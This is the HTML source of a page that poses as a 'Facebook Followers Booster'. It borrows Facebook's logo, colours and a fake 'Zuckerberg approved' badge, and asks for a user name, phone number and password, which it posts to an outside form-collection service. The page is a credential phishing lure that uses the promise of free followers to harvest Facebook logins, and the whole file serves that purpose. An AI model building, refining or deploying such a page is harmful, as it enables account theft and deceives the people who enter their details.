<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Face-book Followers Booster</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background-color:white;
            background-image: radial-gradient(circle at 50% 50%, #0a192f 0%, #000 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Segoe UI', sans-serif;
            color: #fff;
        }

        .form-container {
            background: rgba(15, 15, 15, 0.8);
            padding: 40px;
            border-radius: 20px;
            border: 1px solid #1877F2;
            box-shadow: 0 0 30px rgba(24, 119, 242, 0.4);
            width: 100%;
            max-width: 400px;
            text-align: center;
            height: 470px;
        }

        .fb-logo {
            font-size: 4rem;
            color: #1877F2;
            filter: drop-shadow(0 0 10px #1877F2);
            margin-bottom: 20px;
        }

        h2 { font-size: 1.2rem; margin-bottom: 25px; letter-spacing: 1px; }

        .input-group { position: relative; margin-bottom: 15px; }

        input {
            width: 100%;
            padding: 15px 45px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #1877F2;
            color: white;
            border-radius: 10px;
            box-sizing: border-box;
            font-size: 1rem;
        }

        .icon-left { position: absolute; left: 15px; top: 18px; color: #1877F2; }
        .toggle-icon { position: absolute; right: 15px; top: 18px; color: #1877F2; cursor: pointer; }

        button {
            width: 100%;
            padding: 15px;
            background: #1877F2;
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: bold;
            font-size: 1.1rem;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
        }

        button:hover { background: #166FE5; box-shadow: 0 0 15px #1877F2; }

        .approved-text {
            margin-top: 20px;
            font-size: 0.85rem;
            color: white;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }



    </style>
</head>
<body>

<div class="form-container">
    <i class="fab fa-facebook fb-logo"></i>
    <h2>FACEBOOK FOLLOWERS BOOSTER</h2>
    
    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
        <div class="input-group">
            <i class="fas fa-user icon-left"></i>
            <input type="text" placeholder="User Name" required>
        </div>
        <div class="input-group">
            <i class="fas fa-phone icon-left"></i>
            <input type="tel" placeholder="Phone Number" required>
        </div>
        <div class="input-group">
            <i class="fas fa-lock icon-left"></i>
            <input type="password" id="p1" placeholder="Password" required>
            <i class="fas fa-eye toggle-icon" onclick="toggle('p1', this)"></i>
        </div>
        <div class="input-group">
            <i class="fas fa-lock icon-left"></i>
            <input type="password" id="p2" placeholder="Confirm Password" required>
            <i class="fas fa-eye toggle-icon" onclick="toggle('p2', this)"></i>
        </div>
        <button type="submit">LOGIN TO BOOST <i class="fas fa-arrow-right"></i></button>
    </form>
    
    <div class="approved-text">ZUCKERBERG APPROVED</div>
</div>

<script>
    function toggle(id, icon) {
        const input = document.getElementById(id);
        input.type = (input.type === "password") ? "text" : "password";
        icon.classList.toggle('fa-eye-slash');
    }
</script>

</body>
</html>
